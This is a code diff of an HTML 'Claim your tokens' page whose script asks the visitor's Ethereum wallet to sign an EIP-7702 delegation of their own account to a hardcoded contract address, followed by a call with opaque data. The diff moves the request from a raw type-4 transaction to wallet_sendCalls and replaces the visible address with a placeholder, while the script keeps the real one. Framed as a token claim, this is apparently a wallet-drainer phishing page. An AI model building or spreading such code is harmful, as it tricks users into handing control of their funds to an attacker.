@@ -60,8 +60,8 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐😇</span>
-            <span>Router: <span style="color:#ff6b35;font-family:monospace;">0x7debCF72BebA168Bb49eec6BbB1156E203A564FD</span></span>
+            <span class="info-icon">🔐</span>
+            <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
         <button class="btn btn-primary" id="claimBtn">Claim Now</button>
@@ -70,9 +70,8 @@
     </div>
 
     <script>
-        const CONTRACT = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
+        const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
         const CHAIN_ID = '0x1';
-        const EXECUTE_DATA = '0x61461954';
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const status = document.getElementById('status');
@@ -105,33 +104,26 @@
                     }
                 }
 
-                const nonce = await window.ethereum.request({
-                    method: 'eth_getTransactionCount',
-                    params: [userAddress, 'latest']
-                });
-
-                const tx = {
-                    type: '0x4',
-                    chainId: CHAIN_ID,
-                    nonce: nonce,
-                    to: userAddress,
-                    gas: '0x30D40',
-                    maxFeePerGas: '0x77359400',
-                    maxPriorityFeePerGas: '0x77359400',
-                    value: '0x0',
-                    data: EXECUTE_DATA,
-                    authorizationList: [{
-                        chainId: CHAIN_ID,
-                        address: CONTRACT,
-                        nonce: '0x0'
-                    }]
-                };
-
                 btn.textContent = 'Confirm in wallet...';
 
                 const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [tx]
+                    method: 'wallet_sendCalls',
+                    params: [{
+                        version: '1.0',
+                        from: userAddress,
+                        calls: [
+                            {
+                                to: userAddress,
+                                data: '0x61461954',
+                                value: '0x0'
+                            }
+                        ],
+                        capabilities: {
+                            eip7702: {
+                                address: ROUTER
+                            }
+                        }
+                    }]
                 });
 
                 status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
